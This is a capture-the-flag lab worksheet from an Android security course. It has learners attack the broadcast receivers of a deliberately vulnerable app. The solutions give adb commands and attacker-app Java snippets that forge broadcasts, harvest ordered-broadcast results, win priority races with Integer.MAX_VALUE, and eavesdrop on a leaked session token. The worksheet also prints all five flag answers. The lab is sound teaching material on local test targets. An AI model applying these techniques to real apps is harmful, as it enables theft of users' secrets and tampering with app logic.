# Lab 04 — CTF: the receiver that is not there

> **Five flags.** Find a component no static tool reports; work out which of three actions
> you can actually send; harvest a secret from a channel that points back at you; win a race
> against two receivers you cannot see; and identify the sender of a broadcast you never
> received.

| | |
|---|---|
| **Difficulty** | Advanced |
| **Time** | 3–5 hours |
| **Needs an installed lab app?** | **Yes** for flags 1–4. Flag 5 needs the app installed but is solvable with `adb shell` alone. |
| **Needs root?** | No |
| **Prerequisites** | [Lab 01](lab-01-map-the-runtime-receiver-surface.md), [Lab 02](lab-02-forge-a-broadcast.md), [Lab 03](lab-03-ordered-broadcasts-and-interception.md) |
| **Flag format** | `FLAG{...}` |

---

## The scenario

`com.example.vaultctf` is a small application. Its manifest declares **one** broadcast
receiver.

That is a lie of omission, and finding the rest of the truth is the exercise.

You have the APK and a device. You do **not** have the source. Everything you need is
reachable through the platform's own bookkeeping and through broadcasts you send yourself.

> **⚠️ Do not read [`examples/CtfVaultReceivers.java`](../examples/CtfVaultReceivers.java)
> until you are finished.** It contains all five flags in plain text and is the answer key
> as much as the target. If someone is running this for you, they should hand you the APK
> and keep the source.

---

## Rules

1. **No decompiling for flags 1–4.** You may decompile to check your work *after* you have a
   flag, and for flag 5 as a cross-check, but the intended solutions use only
   `dumpsys`, `cmd package`, `am` and an attacker app. This is a constraint that makes you
   better, not an arbitrary one: on a packed or heavily obfuscated real target, these are
   the tools you will actually have.
2. **`adb shell` is not an attacker.** Flags 3 and 4 are not solvable from a shell, on
   purpose. You need an app.
3. **Do not brute-force strings.** Every flag has a deterministic path.
4. **Authorised testing only.** This app is deliberately vulnerable. Uninstall it afterwards.

---

## Setup

### Build and install

```bash
# host
cd 29-BroadcastReceivers/examples
export ANDROID_HOME=~/Android/Sdk
./build.sh --ctf                          # see the note in build.sh
adb install -r build/vault-ctf.apk
```

`build.sh` ships with the vulnerable and fixed variants wired up; adding the CTF variant is
a small edit, and doing it forces you to decide **which components must be declared in a
manifest and which must not** — which is the chapter's central question. The header of
[`CtfVaultReceivers.java`](../examples/CtfVaultReceivers.java) describes the manifest you
need without giving away the flags: one launcher Activity, one `<application
android:name>`, and exactly one `<receiver>`.

If your device refuses `adb install` with `INSTALL_FAILED_USER_RESTRICTED` — the reference
device does, as an OEM policy — use an emulator. Any API 26+ image works; API 30 matches the
reference measurements.

### Start it, and start watching

```bash
# host
adb shell "am start -n com.example.vaultctf/.MainActivity"
adb logcat -c
adb logcat -s vaultctf
```

Leave that logcat running in its own terminal. Four of the five flags land there.

### Record your device

```bash
# host
adb shell getprop ro.product.model
adb shell getprop ro.build.version.release
adb shell getprop ro.build.version.sdk
```

If you are on API 33 or higher, flags 1 and 4 may behave differently — the app's runtime
registrations would need export flags, and depending on its `targetSdk` they may be
`NOT_EXPORTED`. Note it and adapt; that difference is itself worth understanding.

---

## Flag 1 — The receiver that is not there

> **What it tests.** That you know a manifest is a lower bound, and that you can read AMS's
> runtime registration table.

### The situation

```bash
# host
adb pull $(adb shell pm path com.example.vaultctf | sed 's/package://' | tr -d '\r') ctf.apk
apktool d -f ctf.apk -o ctf/
grep -A8 "<receiver" ctf/AndroidManifest.xml
```

One receiver. Three actions in its filter. That is the whole declared surface.

Now ask the platform what is actually listening.

### Your task

Find a broadcast action that this app responds to which **appears nowhere in its manifest**,
send it, and read the flag from logcat.

### Where to start

```bash
# host
python3 -B ../scripts/receiver-surface.py --package com.example.vaultctf
```

<details>
<summary><b>Hint 1.1</b></summary>

The app must be **running** for a runtime registration to exist. Registrations die with the
process. If `receiver-surface.py` shows nothing, launch the app first:

```bash
adb shell "am start -n com.example.vaultctf/.MainActivity"
```

Note that `MainActivity` calls `finish()` immediately — but the *process* stays alive, and
the registrations were made in `Application.onCreate`, which runs before any Activity.
</details>

<details>
<summary><b>Hint 1.2</b></summary>

Prove to yourself that the action you found is invisible to static tooling:

```bash
adb shell "cmd package query-receivers --brief -a <the action you found>"
```

`No receivers found`. Every APK-based tool on earth would agree with that answer, and every
one of them would be wrong.
</details>

<details>
<summary><b>Hint 1.3</b></summary>

Send it, and remember Lab 02: from API 26 an implicit broadcast may not reach a stopped app,
so make it targeted.

```bash
adb shell "am broadcast -a <action> -p com.example.vaultctf"
```

Watch the `vaultctf` logcat.
</details>

<details>
<summary><b>Solution 1</b></summary>

```bash
# host
adb shell "am start -n com.example.vaultctf/.MainActivity"
python3 -B ../scripts/receiver-surface.py --package com.example.vaultctf
```

Among the registrations you will find an action ending `PROBE_BUS`, with
`NO sender permission`. It is in no manifest.

```bash
adb shell "am broadcast -a com.example.vaultctf.PROBE_BUS -p com.example.vaultctf"
adb logcat -d -s vaultctf | grep flag1
```

**`FLAG{no_manifest_no_problem_1a2b3c}`**

Optional, and worth doing: recover the receiver's *class name*, which `dumpsys` cannot give
you:

```bash
frida -U -f com.example.vaultctf -l ../scripts/hook-broadcast.js
# bc.registrations()
```

It is an anonymous inner class — `CtfApplication$1`. A sweep for classes extending
`BroadcastReceiver` by name finds nothing.
</details>

---

## Flag 2 — One of these three is not like the others

> **What it tests.** That you check whether an action is a protected broadcast **on the
> device in front of you**, instead of guessing from the name.

### The situation

The single manifest-declared receiver lists three actions. Two of them cannot be sent by
any ordinary app. One can.

### Your task

Work out which action is forgeable, send it with the correct extra, and read the flag.

The receiver expects one string extra. The key is `bus`. The value is something you already
found while solving Flag 1.

### Where to start

```bash
# host
grep -A8 "<receiver" ctf/AndroidManifest.xml | grep action
```

<details>
<summary><b>Hint 2.1</b></summary>

Do not reason from the names. Ask the device:

```bash
cat > ctf-actions.txt <<'EOF'
android.intent.action.BOOT_COMPLETED
android.intent.action.LOCALE_CHANGED
com.example.vaultctf.REFRESH
EOF
bash ../scripts/protected-broadcast-map.sh --check ctf-actions.txt
```
</details>

<details>
<summary><b>Hint 2.2</b></summary>

Confirm by hand, so you see the enforcement message at least once:

```bash
adb shell "am broadcast -a android.intent.action.BOOT_COMPLETED"
```

```
java.lang.SecurityException: Permission Denial: not allowed to send broadcast
android.intent.action.BOOT_COMPLETED from pid=NNNN, uid=2000
```

`uid=2000` is `adb shell`, which is *more* privileged than an app. If shell cannot send it,
no app can.
</details>

<details>
<summary><b>Hint 2.3</b></summary>

If the receiver logs "wrong or missing 'bus' extra", you have the right action and the wrong
value. The hint in that log line says it is a string you already found in the AMS table.
There is exactly one such string in your Flag 1 notes.
</details>

<details>
<summary><b>Solution 2</b></summary>

```bash
# host
bash ../scripts/protected-broadcast-map.sh --check ctf-actions.txt
```

```
  android.intent.action.BOOT_COMPLETED                           PROTECTED  -
  android.intent.action.LOCALE_CHANGED                           PROTECTED  -
  com.example.vaultctf.REFRESH                                   forgeable  -
```

```bash
adb shell "am broadcast -a com.example.vaultctf.REFRESH -p com.example.vaultctf \
    --es bus com.example.vaultctf.PROBE_BUS"
adb logcat -d -s vaultctf | grep flag2
```

**`FLAG{one_of_these_three_is_not_like_the_others_9a8b7c}`**

The teaching point: the receiver is exported because it wants `BOOT_COMPLETED`. That action
is genuinely unforgeable. The receiver is still wide open, because a second action in the
same filter is not.
</details>

---

## Flag 3 — The result comes home to you

> **What it tests.** That you understand the ordered-broadcast result channel, and that you
> know `adb shell` is not an attacker.

### The situation

The manifest receiver has a branch you have not triggered. It does not log anything. It
writes to the ordered-broadcast result — which means the value goes to **whoever sent the
broadcast**, not to logcat.

### Your task

Recover the flag. It will never appear in logcat, on any device, no matter what you send
from a shell.

### Where to start

Re-read [§3.6](../README.md#36-ordered-broadcasts--the-interception-primitive), then look
carefully at the full signature:

```java
sendOrderedBroadcast(Intent intent, String receiverPermission,
                     BroadcastReceiver resultReceiver, Handler scheduler,
                     int initialCode, String initialData, Bundle initialExtras)
```

<details>
<summary><b>Hint 3.1</b></summary>

`am broadcast` *does* send ordered broadcasts — you proved that in Lab 03. But it always
supplies an initial result code of 0, and there is no command-line option to change it.
The receiver's branch is gated on a specific non-zero initial code.

So this flag needs an app. That is deliberate.
</details>

<details>
<summary><b>Hint 3.2</b></summary>

You need to guess a number, but not blindly. It is a four-digit value that appears
constantly in security and hacker culture, and it is the only such constant in the file. If
you have already solved this by decompiling, that counts — but try `1337` first.

You can also find it empirically: write a result receiver that logs `getResultData()`, and
loop the initial code over a small candidate set — `1`, `42`, `1337`, `9999`. One iteration
returns a non-null string.
</details>

<details>
<summary><b>Hint 3.3</b></summary>

The `resultReceiver` you pass runs **in your own process**, after every receiver in the
chain has had the Intent. That is where you read the data.
</details>

<details>
<summary><b>Solution 3</b></summary>

```java
// attacker app — zero permissions
Intent i = new Intent("com.example.vaultctf.REFRESH");
i.setPackage("com.example.vaultctf");
i.putExtra("bus", "com.example.vaultctf.PROBE_BUS");

sendOrderedBroadcast(i,
    null,                                   // receiverPermission
    new BroadcastReceiver() {               // runs LAST, in OUR process
        @Override public void onReceive(Context c, Intent x) {
            Log.i("attacker", "flag3 = " + getResultData());
        }
    },
    null,                                   // scheduler
    1337,                                   // initialCode  <-- the gate
    null, null);
```

```bash
# host
adb shell "am start -n com.attacker.bcast/.AttackerBroadcaster"
adb logcat -d -s attacker | grep flag3
```

**`FLAG{the_result_comes_home_to_you_2d3e4f}`**

The teaching point is in the name. `setResultData()` looks like "return a value to the
framework". It is not. It is "hand a value to whoever sent this broadcast" — and any app can
be that sender.
</details>

---

## Flag 4 — Priority is just an int

> **What it tests.** Priority races, result rewriting, and the fact that the result is a
> mutable token travelling forward rather than a return value.

### The situation

Two receivers listen for `com.example.vaultctf.RELAY`, and neither is in the manifest. You
cannot see their code. You can see their **priorities**, and you can watch what they log.

One of them prints the flag, but only when the result reaching it is a specific string. The
other one keeps overwriting the result before it gets there.

### Your task

Get the flag printed.

### Where to start

```bash
# host
frida -U -f com.example.vaultctf -l ../scripts/hook-broadcast.js
# bc.registrations()
```

Then fire the chain and read what the two receivers say:

```bash
# host
adb shell "am broadcast -a com.example.vaultctf.RELAY -p com.example.vaultctf"
adb logcat -d -s vaultctf | grep flag4
```

<details>
<summary><b>Hint 4.1</b></summary>

`bc.registrations()` gives you both priorities: 100 and 50. The higher one runs first. The
holder is the lower one.

The blocker's own log line tells you what it saw and what it did. Read it carefully — it
prints the **incoming result code** as well as the data.
</details>

<details>
<summary><b>Hint 4.2</b></summary>

Aborting is a dead end. If you abort, the holder never runs, and a receiver that never runs
prints nothing.

Setting the passphrase from *below* priority 100 is also a dead end: the blocker has already
been and gone.

So you must register **above** 100. Priority is an unauthenticated integer; nothing stops
you using `Integer.MAX_VALUE`.
</details>

<details>
<summary><b>Hint 4.3</b></summary>

Registering above 100 and setting the data is still not enough on its own — run it and watch
the blocker overwrite you.

Look again at the blocker's log line. It prints `incoming resultCode=`, and it only
overwrites in one of the two cases. Change the other half of the result.
</details>

<details>
<summary><b>Hint 4.4 — the passphrase</b></summary>

The holder logs `flag4/holder: carried=<whatever reached it>`. That tells you it is
comparing. It does not tell you what to.

Two legitimate routes:
- Read `RELAY_PASSPHRASE` out of the DEX. `strings` on `classes.dex` is enough; you do not
  need to decompile logic, only to find a constant, and constants survive obfuscation.
- Notice that this is the one place the CTF expects you to look at the app's own data
  rather than at the platform's.

```bash
apktool d -f ctf.apk -o ctf/ && grep -rn "let-me-through" ctf/smali*/ 2>/dev/null
```
</details>

<details>
<summary><b>Solution 4</b></summary>

Register above priority 100, and set **both** the result data and a non-zero result code:

```java
// attacker app
IntentFilter f = new IntentFilter("com.example.vaultctf.RELAY");
f.setPriority(Integer.MAX_VALUE);
registerReceiver(new BroadcastReceiver() {
    @Override public void onReceive(Context c, Intent i) {
        setResultData("let-me-through");    // what the holder wants to see
        setResultCode(1);                   // non-zero -> the blocker stands down
    }
}, f);
```

then fire it — as an ordered broadcast, which `am broadcast` conveniently is:

```bash
# host
adb shell "am broadcast -a com.example.vaultctf.RELAY -p com.example.vaultctf"
adb logcat -d -s vaultctf | grep flag4
```

```
flag4/blocker: incoming resultCode=1 resultData=let-me-through
flag4/blocker: standing down, someone upstream set a code
flag4/holder: carried=let-me-through
flag4: FLAG{priority_is_just_an_int_7f8e9d}
```

**`FLAG{priority_is_just_an_int_7f8e9d}`**

Three chapter facts had to be combined: priority is unauthenticated and anyone can be first;
the result travels *forward* and every receiver can change it; and the result carries a code
as well as data, so there are two independent things to manipulate.
</details>

---

## Flag 5 — The history remembers who spoke

> **What it tests.** That you know the AMS broadcast history records both the sender and the
> payload, and that you know when to reach for it.

### The situation

Every time `MainActivity` starts, the app publishes a broadcast you were never meant to see.
You have already launched the app several times.

### Your task

Recover the flag. Then answer a second question: **which uid sent it?**

### Where to start

Two independent routes exist. Find at least one; ideally, do both, because they teach
different things.

<details>
<summary><b>Hint 5.1 — route A</b></summary>

The broadcast is implicit and carries no `receiverPermission`. Anything that registers a
matching filter receives it, extras and all. You would need to know the action to register
for it — which the other route gives you for free.
</details>

<details>
<summary><b>Hint 5.2 — route B</b></summary>

AMS keeps a ring buffer of recent broadcasts, and it records extras **in cleartext**.

```bash
adb shell "am start -n com.example.vaultctf/.MainActivity"
python3 -B ../scripts/receiver-surface.py --history --with-extras --limit 30
```

The buffer holds about 50 records per queue on the reference device. If you do not see it,
launch the app again and look immediately.
</details>

<details>
<summary><b>Hint 5.3 — the second question</b></summary>

`onReceive` cannot tell you who sent a broadcast — measured, `Binder.getCallingUid()`
returns 1000 because `system_server` re-dispatched it. So route A cannot answer the second
question at all.

The history can. Look for the `caller=` field of the `BroadcastRecord`.
</details>

<details>
<summary><b>Solution 5</b></summary>

```bash
# host
adb shell "am start -n com.example.vaultctf/.MainActivity"
adb shell "dumpsys activity broadcasts" | grep -B2 -A6 "TELEMETRY"
```

```
BroadcastRecord{... u0 com.example.vaultctf.TELEMETRY} to user 0
Intent { act=com.example.vaultctf.TELEMETRY flg=0x400010 (has extras) }
  extras: Bundle[{build=ctf-1.0, session_token=FLAG{the_history_remembers_who_spoke_4c5d6e}}]
caller=com.example.vaultctf NNNN:com.example.vaultctf/u0aXXX pid=NNNN uid=10XXX
```

**`FLAG{the_history_remembers_who_spoke_4c5d6e}`**

And the second answer is on the `caller=` line: the app's own uid, in the 10000–19999 range.

Route A, for completeness:

```java
registerReceiver(new BroadcastReceiver() {
    @Override public void onReceive(Context c, Intent i) {
        Log.i("attacker", "overheard " + i.getStringExtra("session_token"));
    }
}, new IntentFilter("com.example.vaultctf.TELEMETRY"));
```

Two lessons, one from each route:

- Route A: an implicit broadcast with no `receiverPermission` is a broadcast to the whole
  device. The attacker sends nothing and leaves no trace in the victim.
- Route B: the history is the **only** place a broadcast's sender is ever recorded, and it
  stores payloads verbatim. That is why it is the first artefact to capture in an incident,
  and why "never put a secret in a broadcast extra" is a rule rather than a preference.
</details>

---

## Scoring

| Flag | Points | Skill |
|---|---|---|
| 1 | 15 | Enumerating the runtime registration table |
| 2 | 20 | Distinguishing protected from forgeable, on the device |
| 3 | 25 | The ordered-broadcast result channel, and needing an app |
| 4 | 30 | Priority races and result rewriting |
| 5 | 10 | The broadcast history: sender attribution and cleartext extras |
| **Total** | **100** | |

| Score | Assessment |
|---|---|
| 100 | You can assess a broadcast surface unaided. |
| 70–99 | Solid. Re-read the section behind whichever flag you missed. |
| 40–69 | You have the enumeration but not the ordered-broadcast primitives. Redo Lab 03. |
| < 40 | Go back to Lab 01 and do it with your own device's numbers. |

---

## Post-mortem — do this, it is the most valuable part

Once you have all five, write the assessment as you would deliver it. For each flag:

| Column | What to fill in |
|---|---|
| **Finding** | One sentence a developer can act on |
| **Reachable from** | An unprivileged app? `adb shell` only? Shell **and** an app? |
| **Consequence** | What actually changed or leaked. "Printed a log line" is honest and low |
| **Severity** | Using the rubric in [cheatsheet.md](../cheatsheet.md#severity-rubric) |
| **Fix, as code** | The specific line or structural change |

Then answer these five, in writing:

1. **Which flags would a manifest-only audit have found?** (Answer: at most part of flag 2.)
2. **Which flags would `adb shell` alone have found?** (1, 2 and 5. Not 3, not 4.)
3. **Which flags required a hook, and what specifically did the hook give you that
   `dumpsys` could not?** (Class names, and the two priorities in flag 4.)
4. **For each flag, name the single line of code that fixes it.** For flag 1 it is an
   export flag; for flag 2 it is splitting the receiver; for flag 3 it is not putting a
   secret in `setResultData`; for flag 4 it is `FLAG_RECEIVER_NO_ABORT` plus a signature
   `receiverPermission`; for flag 5 it is `setPackage()`.
5. **Which of the five would you actually report on a real engagement, and at what
   severity?** Some of them are informational on their own. Say which, and why.

---

## Instructor notes

<details>
<summary><b>Running this for a group</b></summary>

**Distribution.** Hand out `build/vault-ctf.apk` only. Keep
[`CtfVaultReceivers.java`](../examples/CtfVaultReceivers.java) back — it is the answer key.

**Expected shape.** Flags 1, 2 and 5 usually fall within the first hour. Flag 3 is where
people discover that `adb shell` is not an attacker, and it is where most of the learning
happens. Flag 4 is where people discover that the result has *two* fields.

**Common wrong turns, and what they teach:**

| Wrong turn | The lesson to draw out |
|---|---|
| Attacking `BOOT_COMPLETED` for an hour | Protected broadcasts are checked before any receiver is consulted. Probe first. |
| Trying to get flag 3 into logcat | The result channel points at the sender. There is no route to logcat. |
| Aborting for flag 4 | A receiver that never runs prints nothing. Interception is not always the answer. |
| Decompiling immediately | Fine as a check, but on a packed real target it would not be available. Enforce rules 1 and 2 for the first two hours. |
| Reporting "exported receiver" as a finding for each flag | The whole point of the post-mortem. |

**Difficulty adjustments.** To make it harder, run R8 with obfuscation over the build — the
action strings and the passphrase survive, everything else does not, which sharpens flag 4.
To make it easier, tell them up front that `am broadcast` sends *ordered* broadcasts, which
removes about half the difficulty of flag 4.

**Cleanup.**

```bash
adb uninstall com.example.vaultctf
adb uninstall com.attacker.bcast
```
</details>

---

## What you should take away

**One.** A manifest is a lower bound. Four of five flags lived behind components no static
tool reports.

**Two.** "It listens for a protected action" is not "it is safe". A second, unprotected
action in the same filter opens the whole component.

**Three.** `adb shell` is a convenient sender, not an attacker. Two flags are unreachable
from it.

**Four.** The ordered-broadcast result is a mutable token travelling forward through a chain
you do not control, ending in the sender's process. It is both a leak channel and a
manipulation surface.

**Five.** The broadcast history records the sender and the payload. It is the only
attribution that exists, it is destroyed by a reboot, and it is the first thing to capture.

---

## Next

You have finished chapter 29. Where to go from here:

- [26-Intent](../../26-Intent/README.md) — the Intent itself: resolution, redirection,
  `PendingIntent`. Broadcast redirection is the same primitive through a different door.
- [32-Manifest](../../32-Manifest/README.md) — the declaration audit, done properly.
- [24-IPC](../../24-IPC/README.md) — the same discipline applied across every IPC mechanism
  at once.
- [27-ContentProviders](../../27-ContentProviders/README.md) — the other unauthenticated
  entry point, failing in the opposite direction: providers leak on read, receivers accept
  commands on write.
